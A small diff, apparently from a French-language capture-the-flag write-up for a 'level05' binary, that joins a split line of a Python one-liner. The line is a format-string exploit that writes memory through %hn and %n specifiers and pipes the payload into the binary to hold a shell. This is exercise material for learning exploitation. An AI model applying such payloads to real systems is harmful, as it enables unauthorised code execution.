@@ -112,6 +112,5 @@ On peut maintenant exploiter le binaire avec la commande suivante:
 
 Ou directement comme ca:
 ```
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%" + str(0xd8d0 - 8) + "x%10$hn" +"%" + str(0xffff -
-0xd8d0) + "x%11$n")';cat) | ./level05
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%" + str(0xd8d0 - 8) + "x%10$hn" +"%" + str(0xffff - 0xd8d0) + "x%11$n")';cat) | ./level05
 ```
